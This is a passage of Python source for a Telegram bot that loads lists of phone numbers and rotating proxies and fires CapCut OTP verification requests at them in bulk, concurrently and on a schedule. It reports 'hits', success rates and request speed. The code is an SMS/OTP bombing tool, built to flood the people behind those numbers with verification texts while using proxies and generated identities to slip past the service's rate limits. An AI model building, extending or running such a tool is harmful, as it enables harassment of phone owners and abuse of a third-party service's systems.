    user_id = update.effective_user.id
    user_states[user_id]['awaiting'] = 'numbers'
    user_states[user_id]['numbers_buffer'] = []
    
    await update.message.reply_text(
        "📱 <b>Set Numbers</b>\n\n"
        "Send phone numbers:\n"
        "• One per line OR comma separated\n"
        "• Send in multiple messages\n"
        "• Send /done when finished",
        parse_mode="HTML"
    )


async def setproxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_states[user_id]['awaiting'] = 'proxies'
    user_states[user_id]['proxies_buffer'] = []
    
    await update.message.reply_text(
        "🔒 <b>Set Proxies</b>\n\n"
        "Send proxies (one per line):\n"
        "• ip:port\n"
        "• ip:port:user:pass\n"
        "• http://user:pass@ip:port\n\n"
        "Send /done when finished",
        parse_mode="HTML"
    )


async def uploadnumbers_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_states[user_id]['awaiting'] = 'file_numbers'
    
    await update.message.reply_text(
        "📁 <b>Upload Numbers File</b>\n\n"
        "Send a TXT or CSV file containing phone numbers.\n"
        "I'll extract all valid numbers automatically.",
        parse_mode="HTML"
    )


async def uploadproxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_states[user_id]['awaiting'] = 'file_proxies'
    
    await update.message.reply_text(
        "📁 <b>Upload Proxies File</b>\n\n"
        "Send a TXT file containing proxies.\n"
        "Format: ip:port or ip:port:user:pass",
        parse_mode="HTML"
    )


async def clearnumbers_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_states[user_id]['numbers'] = []
    user_states[user_id]['numbers_buffer'] = []
    await update.message.reply_text("✅ Numbers cleared!", parse_mode="HTML")


async def clearproxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_states[user_id]['proxies'] = []
    user_states[user_id]['proxies_buffer'] = []
    await update.message.reply_text("✅ Proxies cleared!", parse_mode="HTML")


async def tasks_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    tasks = task_manager.get_all_tasks()
    
    if not tasks:
        await update.message.reply_text("📋 No tasks.", parse_mode="HTML")
        return
    
    msg = "📋 <b>Tasks:</b>\n\n"
    for task in tasks[-10:]:
        status_emoji = {"pending": "⏳", "running": "🔄", "completed": "✅", "cancelled": "❌"}.get(task.status, "❓")
        progress = f"{task.current_index}/{len(task.phone_numbers)}"
        elapsed = time.time() - task.start_time
        speed = task.current_index / elapsed if elapsed > 0 else 0
        msg += f"{status_emoji} <b>{task.task_id}</b>\n"
        msg += f"   📊 Progress: {progress}\n"
        msg += f"   ✅ {task.success_count} | ❌ {task.fail_count}\n"
        msg += f"   🚀 Speed: {speed:.1f} req/s\n\n"
    
    await update.message.reply_text(msg, parse_mode="HTML")


async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.args:
        task_id = context.args[0]
        if await task_manager.cancel_task(task_id):
            await update.message.reply_text(f"✅ Task {task_id} cancelled.", parse_mode="HTML")
        else:
            await update.message.reply_text(f"❌ Task {task_id} not found.", parse_mode="HTML")
    else:
        await update.message.reply_text("Usage: /cancel <task_id>", parse_mode="HTML")


async def done_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    awaiting = user_states[user_id].get('awaiting')
    
    if awaiting == 'numbers':
        numbers = user_states[user_id].get('numbers_buffer', [])
        user_states[user_id]['numbers'] = numbers
        user_states[user_id]['awaiting'] = None
        user_states[user_id]['numbers_buffer'] = []
        await update.message.reply_text(f"✅ <b>{len(numbers):,} numbers saved!</b>", parse_mode="HTML")
    
    elif awaiting == 'proxies':
        proxies = user_states[user_id].get('proxies_buffer', [])
        user_states[user_id]['proxies'] = proxies
        user_states[user_id]['awaiting'] = None
        user_states[user_id]['proxies_buffer'] = []
        await update.message.reply_text(f"✅ <b>{len(proxies):,} proxies saved!</b>", parse_mode="HTML")
    
    else:
        await update.message.reply_text("❓ Nothing to finish.", parse_mode="HTML")


# ============================================
# CALLBACK HANDLERS
# ============================================

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    if data == "bulk":
        user_id = query.from_user.id
        numbers = user_states[user_id].get('numbers', [])
        if not numbers:
            await query.edit_message_text(
                "❌ <b>No numbers loaded!</b>\n\n"
                "Use /setnumbers or /uploadnumbers first.",
                parse_mode="HTML"
            )
        else:
            proxies = user_states[user_id].get('proxies', [])
            await query.edit_message_text(f"🚀 Starting bulk task with {len(numbers):,} numbers...", parse_mode="HTML")
            await start_bulk_task_from_callback(context, query, numbers, proxies)
    
    elif data == "single":
        await query.edit_message_text(
            "📱 <b>Single OTP</b>\n\n"
            "Send: <code>/single +923099003842</code>",
            parse_mode="HTML"
        )
    
    elif data == "upload_numbers":
        user_id = query.from_user.id
        user_states[user_id]['awaiting'] = 'file_numbers'
        await query.edit_message_text(
            "📁 <b>Upload Numbers File</b>\n\n"
            "Send a TXT or CSV file.",
            parse_mode="HTML"
        )
    
    elif data == "upload_proxies":
        user_id = query.from_user.id
        user_states[user_id]['awaiting'] = 'file_proxies'
        await query.edit_message_text(
            "📁 <b>Upload Proxies File</b>\n\n"
            "Send a TXT file with proxies.",
            parse_mode="HTML"
        )
    
    elif data == "schedule":
        await query.edit_message_text(
            "⏰ <b>Schedule Task</b>\n\n"
            "Use: <code>/schedule HH:MM</code>\n"
            "Example: <code>/schedule 14:30</code>\n\n"
            "Time is in Pakistan timezone (PKT)",
            parse_mode="HTML"
        )
    
    elif data == "scheduled_list":
        scheduled_tasks = task_manager.get_all_scheduled_tasks()
        pending = [s for s in scheduled_tasks if s.status == "pending"]
        
        if not pending:
            await query.edit_message_text("📋 No scheduled tasks.", parse_mode="HTML")
        else:
            msg = "⏰ <b>Scheduled Tasks:</b>\n\n"
            for task in pending[-5:]:
                msg += f"🆔 {task.schedule_id}\n"
                msg += f"   📱 Numbers: {len(task.phone_numbers):,}\n"
                msg += f"   🕐 Time: {task.scheduled_time.strftime('%I:%M %p PKT')}\n\n"
            await query.edit_message_text(msg, parse_mode="HTML")
    
    elif data == "status":
        stats = identity_generator.get_stats()
        running = task_manager.get_running_count()
        pk_time = get_pakistan_time().strftime("%I:%M:%S %p")
        g_stats = global_stats.get_stats()
        
        await query.edit_message_text(
            f"📊 <b>Status</b>\n\n"
            f"🤖 Bot: Online ✅\n"
            f"📦 SignerPy: {'✅' if SIGNERPY_AVAILABLE else '❌'}\n"
            f"🕐 Time: {pk_time}\n"
            f"📋 Running: {running}\n"
            f"🔢 IDs Generated: {stats['total_generated']:,}\n\n"
            f"📈 <b>Global:</b>\n"
            f"• Requests: {g_stats['total_requests']:,}\n"
            f"• Success: {g_stats['total_success']:,}\n"
            f"• Failed: {g_stats['total_failed']:,}",
            parse_mode="HTML"
        )
    
    elif data == "tasks":
        tasks = task_manager.get_all_tasks()
        if not tasks:
            await query.edit_message_text("📋 No tasks.", parse_mode="HTML")
        else:
            msg = "📋 <b>Tasks:</b>\n\n"
            for task in tasks[-5:]:
                status_emoji = {"pending": "⏳", "running": "🔄", "completed": "✅", "cancelled": "❌"}.get(task.status, "❓")
                msg += f"{status_emoji} {task.task_id}: {task.current_index}/{len(task.phone_numbers)}\n"
            await query.edit_message_text(msg, parse_mode="HTML")
    
    elif data == "global_stats":
        g_stats = global_stats.get_stats()
        uptime_mins = g_stats['uptime_seconds'] / 60
        success_rate = (g_stats['total_success'] / g_stats['total_requests'] * 100) if g_stats['total_requests'] > 0 else 0
        
        await query.edit_message_text(
            f"📈 <b>Global Statistics</b>\n\n"
            f"🔢 Total Requests: {g_stats['total_requests']:,}\n"
            f"✅ Success: {g_stats['total_success']:,}\n"
            f"❌ Failed: {g_stats['total_failed']:,}\n"
            f"📊 Success Rate: {success_rate:.1f}%\n\n"
            f"⏱ Uptime: {uptime_mins:.1f} min\n"
            f"🚀 Req/Min: {g_stats['requests_per_minute']:.1f}",
            parse_mode="HTML"
        )


# ============================================
# OTP PROCESSING - ULTRA FAST
# ============================================

async def process_single_otp(update: Update, context: ContextTypes.DEFAULT_TYPE, phone: str):
    user_id = update.effective_user.id
    proxies = user_states[user_id].get('proxies', [])
    
    # Parse proxy from command if provided
    parts = phone.split()
    phone_num = parts[0]
    proxy = parts[1] if len(parts) > 1 else None
    
    if not proxy and proxies:
        proxy = random.choice(proxies)
    
    # Use thread pool for blocking operation
    loop = asyncio.get_event_loop()
    sender = CapCutOTPSender(identity_generator)
    result = await loop.run_in_executor(thread_pool, sender.send_otp_sync, phone_num, proxy)
    
    await global_stats.increment(result.get("success", False))
    
    if result.get("success"):
        status = "✅ SUCCESS"
        status_detail = result.get("message", "OTP Sent")
    else:
        status = "❌ FAILED"
        error = result.get("data", {}).get("description", result.get("error", "Unknown")) if isinstance(result.get("data"), dict) else result.get("error", "Unknown")
        status_detail = str(error)[:100]
    
    time_ms = result.get("time_ms", 0)
    
    msg = f"""
{'✅' if result.get('success') else '❌'} <b>OTP Result</b>

📱 Phone: <code>{phone_num}</code>
🌐 Proxy: {(proxy or 'Direct')[:30]}
📊 Status: {status_detail}
⏱ Time: {time_ms:.2f}ms
"""
    await update.message.reply_text(msg, parse_mode="HTML")


async def start_bulk_task(update: Update, context: ContextTypes.DEFAULT_TYPE, numbers: List[str], proxies: List[str]):
    chat_id = str(update.effective_chat.id)
    task_id = await task_manager.create_task(numbers, proxies, chat_id)
    task = task_manager.get_task(task_id)
    task.status = "running"
    task_manager.running_tasks.add(task_id)
    
    await update.message.reply_text(
        f"🚀 <b>Task #{task_id} Started!</b>\n\n"
        f"📱 Numbers: {len(numbers):,}\n"
        f"🔒 Proxies: {len(proxies):,}\n"
        f"⚡ Concurrent: {MAX_CONCURRENT_OTP}\n\n"
        f"Use /cancel {task_id} to stop.",
        parse_mode="HTML"
    )
    
    # Run in background - non-blocking
    asyncio.create_task(run_bulk_task_concurrent(context, task))


async def start_bulk_task_from_callback(context: ContextTypes.DEFAULT_TYPE, query, numbers: List[str], proxies: List[str]):
    chat_id = str(query.message.chat_id)
    task_id = await task_manager.create_task(numbers, proxies, chat_id)
    task = task_manager.get_task(task_id)
    task.status = "running"
    task_manager.running_tasks.add(task_id)
    
    await context.bot.send_message(
        chat_id=chat_id,
        text=f"🚀 <b>Task #{task_id} Started!</b>\n\n"
             f"📱 Numbers: {len(numbers):,}\n"
             f"🔒 Proxies: {len(proxies):,}\n"
             f"⚡ Concurrent: {MAX_CONCURRENT_OTP}\n\n"
             f"Use /cancel {task_id} to stop.",
        parse_mode="HTML"
    )
    
    asyncio.create_task(run_bulk_task_concurrent(context, task))


async def run_scheduled_task(context: ContextTypes.DEFAULT_TYPE, schedule_id: str):
    """Run a scheduled task at the specified time"""
    scheduled_task = task_manager.get_scheduled_task(schedule_id)
    if not scheduled_task:
        return
    
    # Wait until scheduled time
    now = get_pakistan_time()
    wait_seconds = (scheduled_task.scheduled_time - now).total_seconds()
    
    if wait_seconds > 0:
        await asyncio.sleep(wait_seconds)
    
    # Check if cancelled
    if scheduled_task.status == "cancelled":
        return
    
    scheduled_task.status = "running"
    
    # Create and run the task
    task_id = await task_manager.create_task(
        scheduled_task.phone_numbers,
        scheduled_task.proxies,
        scheduled_task.chat_id
    )
    task = task_manager.get_task(task_id)
    task.status = "running"
    task_manager.running_tasks.add(task_id)
    
    await context.bot.send_message(
        chat_id=scheduled_task.chat_id,
        text=f"⏰ <b>Scheduled Task Starting!</b>\n\n"
             f"🆔 Schedule: {schedule_id}\n"
             f"🆔 Task: {task_id}\n"
             f"📱 Numbers: {len(scheduled_task.phone_numbers):,}\n"
             f"🔒 Proxies: {len(scheduled_task.proxies):,}",
        parse_mode="HTML"
    )
    
    await run_bulk_task_concurrent(context, task)
    scheduled_task.status = "completed"


async def run_bulk_task_concurrent(context: ContextTypes.DEFAULT_TYPE, task: Task):
    """Run bulk task with TRUE CONCURRENCY - 5-10 requests at once"""
    
    semaphore = asyncio.Semaphore(MAX_CONCURRENT_OTP)
    batch_results = []
    last_log_count = 0
    
    # Process in batches for better control
    for batch_start in range(0, len(task.phone_numbers), BATCH_SIZE):
        if task.cancelled:
            break
        
        batch_end = min(batch_start + BATCH_SIZE, len(task.phone_numbers))
        batch = task.phone_numbers[batch_start:batch_end]
        
        # Create concurrent tasks for this batch
        tasks = [
            send_otp_async(phone, task.proxies, semaphore)
            for phone in batch
        ]
        
        # Execute all concurrently
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Process results
        for result in results:
            if isinstance(result, Exception):
                task.fail_count += 1
                batch_results.append({"success": False, "error": str(result)})
            else:
                if result.get("success"):
                    task.success_count += 1
                else:
                    task.fail_count += 1
                batch_results.append(result)
            
            task.current_index += 1
        
        # Log every LOG_INTERVAL requests
        if task.current_index - last_log_count >= LOG_INTERVAL:
            last_log_count = task.current_index
            elapsed = time.time() - task.start_time
            speed = task.current_index / elapsed if elapsed > 0 else 0
            
            # Get last few results for log
            recent_results = batch_results[-LOG_INTERVAL:]
            recent_success = sum(1 for r in recent_results if r.get("success"))
            recent_failed = len(recent_results) - recent_success
            
            # Global stats
            g_stats = global_stats.get_stats()
            
            progress_msg = f"""
📊 <b>Task #{task.task_id} Progress</b>

📈 Progress: {task.current_index}/{len(task.phone_numbers)}
✅ Total Success: {task.success_count}
❌ Total Failed: {task.fail_count}

📋 <b>Last {len(recent_results)} Requests:</b>
✅ Success: {recent_success} | ❌ Failed: {recent_failed}

🚀 Speed: {speed:.1f} req/s
⏱ Elapsed: {elapsed:.1f}s

📈 <b>Global Hits:</b>
• Total: {g_stats['total_requests']:,}
• Success: {g_stats['total_success']:,}
• Failed: {g_stats['total_failed']:,}
"""
            await send_message_safe(context, task.chat_id, progress_msg, parse_mode="HTML")
    
    task.status = "completed" if not task.cancelled else "cancelled"
    task_manager.running_tasks.discard(task.task_id)
    
    # Final message
    elapsed = time.time() - task.start_time
    rate = (task.success_count / len(task.phone_numbers) * 100) if task.phone_numbers else 0
    speed = len(task.phone_numbers) / elapsed if elapsed > 0 else 0
    g_stats = global_stats.get_stats()
    
    final_msg = f"""
🏁 <b>Task #{task.task_id} Complete!</b>

📊 Total: {len(task.phone_numbers)}
✅ Success: {task.success_count}
❌ Failed: {task.fail_count}
📈 Success Rate: {rate:.1f}%

⏱ Total Time: {elapsed:.1f}s
🚀 Average Speed: {speed:.1f} req/s

📈 <b>Global Hits:</b>
• Total Requests: {g_stats['total_requests']:,}
• Total Success: {g_stats['total_success']:,}
• Total Failed: {g_stats['total_failed']:,}
"""
    await send_message_safe(context, task.chat_id, final_msg, parse_mode="HTML")


# ============================================
# MESSAGE & FILE HANDLERS
# ============================================

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    
    if not text:
        return
    
    awaiting = user_states[user_id].get('awaiting')
    
    if awaiting == 'numbers':
        new_numbers = parse_phone_numbers(text)
        if 'numbers_buffer' not in user_states[user_id]:
            user_states[user_id]['numbers_buffer'] = []
        user_states[user_id]['numbers_buffer'].extend(new_numbers)
        count = len(user_states[user_id]['numbers_buffer'])
        await update.message.reply_text(f"📥 +{len(new_numbers):,} numbers (Total: {count:,})\nSend more or /done", parse_mode="HTML")
    
    elif awaiting == 'proxies':
        new_proxies = parse_proxies(text)
        if 'proxies_buffer' not in user_states[user_id]:
            user_states[user_id]['proxies_buffer'] = []
        user_states[user_id]['proxies_buffer'].extend(new_proxies)
        count = len(user_states[user_id]['proxies_buffer'])
        await update.message.reply_text(f"📥 +{len(new_proxies):,} proxies (Total: {count:,})\nSend more or /done", parse_mode="HTML")
    
    elif awaiting == 'single_phone':
        user_states[user_id]['awaiting'] = None
        await process_single_otp(update, context, text.strip())
    
    else:
        # Check if it's a phone number
        text_clean = text.strip()
        if text_clean.startswith('+') or (len(text_clean) >= 10 and text_clean[0].isdigit()):
            await process_single_otp(update, context, text_clean)


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    awaiting = user_states[user_id].get('awaiting')
    
    if awaiting not in ['file_numbers', 'file_proxies']:
        return
    
    document = update.message.document
    file_name = document.file_name.lower()
    
    # Download file
    file = await context.bot.get_file(document.file_id)
    file_bytes = await file.download_as_bytearray()
    content = file_bytes.decode('utf-8', errors='ignore')
    
    if awaiting == 'file_numbers':
        numbers = parse_phone_numbers(content)
        numbers = list(set(numbers))
        user_states[user_id]['numbers'] = numbers
        user_states[user_id]['awaiting'] = None
        
        await update.message.reply_text(
            f"✅ <b>Numbers Loaded!</b>\n\n"
            f"📊 Extracted: {len(numbers):,} unique numbers\n"
            f"📁 File: {document.file_name}",
            parse_mode="HTML"
        )
    
    elif awaiting == 'file_proxies':
        proxies = parse_proxies(content)
        user_states[user_id]['proxies'] = proxies
        user_states[user_id]['awaiting'] = None
        
        await update.message.reply_text(
            f"✅ <b>Proxies Loaded!</b>\n\n"
            f"📊 Loaded: {len(proxies):,} proxies\n"
            f"📁 File: {document.file_name}",
            parse_mode="HTML"
        )


# ============================================
# MAIN
# ============================================

def main():
    if not SIGNERPY_AVAILABLE:
        logger.error("SignerPy not available! Bot may not work correctly.")
    
    # Build application with high concurrency settings
    application = (
        Application.builder()
        .token(BOT_TOKEN)
        .concurrent_updates(True)
        .connection_pool_size(100)
        .pool_timeout(30.0)
        .connect_timeout(30.0)
        .read_timeout(30.0)
        .write_timeout(30.0)
        .build()
    )
    
    # Command handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CommandHandler("single", single_command))
    application.add_handler(CommandHandler("bulk", bulk_command))
    application.add_handler(CommandHandler("schedule", schedule_command))
    application.add_handler(CommandHandler("scheduled", scheduled_command))
    application.add_handler(CommandHandler("cancelschedule", cancelschedule_command))
    application.add_handler(CommandHandler("setnumbers", setnumbers_command))
    application.add_handler(CommandHandler("setproxies", setproxies_command))
    application.add_handler(CommandHandler("uploadnumbers", uploadnumbers_command))
    application.add_handler(CommandHandler("uploadproxies", uploadproxies_command))
    application.add_handler(CommandHandler("clearnumbers", clearnumbers_command))
    application.add_handler(CommandHandler("clearproxies", clearproxies_command))
    application.add_handler(CommandHandler("tasks", tasks_command))
    application.add_handler(CommandHandler("cancel", cancel_command))
    application.add_handler(CommandHandler("done", done_command))
    
    # Callback handler
    application.add_handler(CallbackQueryHandler(button_callback))
    
    # Message handlers
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    logger.info("🚀 Ultra Fast Bot v6.1 starting...")
    logger.info(f"⚡ Max Concurrent OTP: {MAX_CONCURRENT_OTP}")
    logger.info(f"📊 Log Interval: Every {LOG_INTERVAL} requests")
    logger.info(f"⏰ Schedule Feature: Enabled")
    
    application.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)


if __name__ == "__main__":
    main()
